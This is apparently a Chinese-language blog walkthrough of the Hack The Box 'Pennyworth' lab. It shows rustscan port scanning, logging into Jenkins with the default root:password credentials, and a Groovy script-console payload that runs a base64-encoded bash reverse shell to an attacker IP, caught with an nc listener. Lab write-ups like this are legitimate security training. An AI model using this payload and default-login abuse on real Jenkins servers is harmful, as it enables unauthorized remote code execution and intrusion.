---
title: HTB - Pennyworth
published: 2024-05-14
tags: [HTB]
category: Write Up
draft: false
password: startpoint
abstract: 請大家使用比較安全的密碼吧
message: 就跟你講吧 ! 密碼是 startpoint
---

# HTB - Pennyworth
![image](https://hackmd.io/_uploads/SJahgPcgC.png)

### 使用知識
* 弱口令
* Jenkins
* Groovy腳本
* Reverse Shell
* Google (?)

## 過程
1.先掃主機Port
```bash
rustscan -a {target ip}
```
>rustscan 掃描端口速度非常快
>但不是nmap的替代方案,只是快速的發現開啟的Port
>可以使用 rustscan -a {target ip} -- {nmap argment}來做更細微的操作

2.發現```8080```port開啟之後,直接開瀏覽器連入
![image](https://hackmd.io/_uploads/B1JKfvcl0.png)


3.Google 查看 Jenkins 是否有預設密碼是管理者未改變的
``` root:password ```直接進入後台
![image](https://hackmd.io/_uploads/rk0aGDqeR.png)
>p.s 我以為這邊要練習hydra之類的暴力破解工具,沒想到那麼簡單
>不愧是 very easy

4.進入```http://{target ip}:8080/script```來輸入Groovy腳本
我在[Hacktricks](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script)找到一個 Reverse Shell的腳本
先測試作業系統
```=groovy
def process = "PowerShell.exe <WHATEVER>".execute()
println "Found text ${process.text}"
```
報錯了,所以系統應該是Linux,這邊準備Linux用的Reverse Shell
```=bash
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
>第二行 base64 編碼的是 reverse shell 的指令,請把下列改成你自己的ip
>bash -c 'bash -i >& /dev/tcp/{YOUR IP}/{PORT} 0>&1'

5.在本地創建一個接收 Rverse Shell 的 ```nc```
```=bash
nc -lvnp {你剛剛設定的port}
```
![image](https://hackmd.io/_uploads/SkKbLD5gC.png)
接受到對方主機回傳的 shell
flag.txt 就在 root 裡面


---
## 總結
~~其實這題沒什麼技術性~~
但是資訊安全就是靠累積經驗讓自己判斷甚麼時候該做甚麼的領域
想到再補充